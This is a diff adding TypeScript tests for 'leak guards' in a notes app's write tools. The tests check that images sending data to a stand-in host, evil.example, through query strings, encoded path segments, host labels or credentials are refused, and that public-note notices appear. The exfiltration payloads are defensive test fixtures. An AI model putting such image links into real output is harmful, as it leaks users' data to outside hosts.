@@ -993,3 +993,105 @@ describe('write tools: get_note blocks and edit_block (#560)', () => {
         );
     });
 });
+
+describe('write tools: leak guards (#948)', () => {
+    const sharedFolder = (deps: WriteDeps) => {
+        deps.listFolders = async () => FOLDERS.map((f) => (f.id === 'FW' ? { ...f, isPublic: true } : f));
+    };
+    const longSegment = 'c2VjcmV0'.repeat(10);
+    const blocksOf = async (deps: WriteDeps, id: string) => (await getNoteBlocks(deps, { id })).blocks;
+    const webp = fixturePath('cover-plain.webp');
+
+    it.each([
+        ['a query string', '![x](https://evil.example/p.png?d=secret)'],
+        ['a long path segment', `![x](https://evil.example/${longSegment}.png)`],
+        ['a long host label', `![x](https://${longSegment}.evil.example/p.png)`],
+        ['credentials in the URL', '![x](https://secret@evil.example/p.png)'],
+        ['an html img tag', '<img src="https://evil.example/p.png?d=secret" alt="x" width="10">'],
+        ['an http URL', '![x](http://evil.example/p.png?d=secret)'],
+        ['a gallery', '<div data-gallery="row">\n\n![a](https://evil.example/a.png?d=1) ![b](https://evil.example/b.png)\n\n</div>'],
+    ])('refuses an image with %s, writing nothing', async (_, markdown) => {
+        const { deps, put, creates, uploads } = makeDrive();
+        put('nw', 'Body', metadataFor('FW'));
+        await expect(appendToNote(deps, { id: 'nw', markdown })).rejects.toThrow('Image from');
+        await expect(createNote(deps, { title: 'T', markdown, folderId: 'FW' })).rejects.toThrow('evil.example refused');
+        expect(uploads).toHaveLength(0);
+        expect(creates).toHaveLength(0);
+    });
+
+    it('refuses in every tool that takes markdown', async () => {
+        const { deps, put, uploads } = makeDrive();
+        put('nw', 'Body', metadataFor('FW'));
+        const bad = '![x](https://evil.example/p.png?d=secret)';
+        const [body] = await blocksOf(deps, 'nw');
+        const refused = 'evil.example refused';
+        await expect(updateNote(deps, { id: 'nw', markdown: bad })).rejects.toThrow(refused);
+        await expect(replaceInNote(deps, { id: 'nw', old_text: 'Body', new_text: bad })).rejects.toThrow(refused);
+        await expect(editBlock(deps, { note_id: 'nw', block_id: body.id, op: { type: 'replace', markdown: bad } })).rejects.toThrow(refused);
+        expect(uploads).toHaveLength(0);
+    });
+
+    it('keeps such an image the note already has, as update_note gets it back', async () => {
+        const { deps, put, store } = makeDrive();
+        const markdown = 'Body ![x](https://cdn.example/p.png?w=800&h=600)';
+        put('nw', markdown, metadataFor('FW'));
+        const stored = markdownOf(store.get('nw')!.blob);
+        await expect(updateNote(deps, { id: 'nw', markdown: `${stored}\n\nMore` })).resolves.toMatchObject({ id: 'nw' });
+        expect(markdownOf(store.get('nw')!.blob)).toContain('https://cdn.example/p.png?w=800&h=600');
+    });
+
+    it('refuses one with a different query than the image the note has', async () => {
+        const { deps, put } = makeDrive();
+        put('nw', 'Body ![x](https://cdn.example/p.png?w=800)', metadataFor('FW'));
+        await expect(appendToNote(deps, { id: 'nw', markdown: '![x](https://cdn.example/p.png?w=801)' })).rejects.toThrow('refused');
+    });
+
+    it('names the host of a plain external image in the result', async () => {
+        const { deps, put } = makeDrive();
+        put('nw', 'Body', metadataFor('FW'));
+        const { note } = await appendToNote(deps, { id: 'nw', markdown: '![x](https://cdn.example/a.png) ![y](https://cdn.example/b.png)' });
+        expect(note).toBe('This note shows images from cdn.example, which can see each time the note is opened.');
+    });
+
+    it('create_note into a shared folder says the note is public', async () => {
+        const { deps } = makeDrive();
+        sharedFolder(deps);
+        const result = await createNote(deps, { title: 'T', markdown: 'Body', folderId: 'FW' });
+        expect(result.note).toContain('This note is public');
+    });
+
+    it('a note created with an image in a shared folder also says so', async () => {
+        const { deps } = makeDrive();
+        sharedFolder(deps);
+        const result = await createNote(deps, { title: 'T', markdown: `![x](${webp})`, folderId: 'FW' });
+        expect(result.note).toContain('This note is public');
+    });
+
+    it('a private note has no notice', async () => {
+        const { deps, put } = makeDrive();
+        put('nw', 'Body', metadataFor('FW'));
+        expect(await createNote(deps, { title: 'T', markdown: 'Body', folderId: 'FW' })).not.toHaveProperty('note');
+        expect(await updateNote(deps, { id: 'nw', title: 'New' })).toEqual({ id: 'nw' });
+    });
+
+    it('every edit of a public note says it is public', async () => {
+        const { deps, put } = makeDrive();
+        put('np', 'Body', metadataFor('FW', { isPublic: true }));
+        const notice = expect.stringContaining('This note is public');
+        await expect(appendToNote(deps, { id: 'np', markdown: 'More' })).resolves.toMatchObject({ note: notice });
+        await expect(replaceInNote(deps, { id: 'np', old_text: 'More', new_text: 'Most' })).resolves.toMatchObject({ note: notice });
+        await expect(updateNote(deps, { id: 'np', title: 'New' })).resolves.toMatchObject({ note: notice });
+        const [body] = await blocksOf(deps, 'np');
+        await expect(
+            editBlock(deps, { note_id: 'np', block_id: body.id, op: { type: 'replace', markdown: 'Text' } })
+        ).resolves.toMatchObject({ note: notice });
+    });
+
+    it('an edit with an image of a public note says it is public', async () => {
+        const { deps, put } = makeDrive();
+        put('np', 'Body', metadataFor('FW', { isPublic: true }));
+        await expect(appendToNote(deps, { id: 'np', markdown: `![x](${webp})` })).resolves.toMatchObject({
+            note: expect.stringContaining('This note is public'),
+        });
+    });
+});
